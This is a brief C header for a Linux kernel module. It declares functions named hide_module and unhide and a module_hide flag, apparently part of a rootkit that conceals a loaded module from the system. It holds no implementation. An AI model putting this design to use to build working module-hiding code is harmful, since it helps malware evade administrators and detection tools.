#ifndef FILE_H_MODULE
#define FILE_H_MODULE
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>

void hide_module(void);
void unhide(void);
extern bool module_hide;
#endif
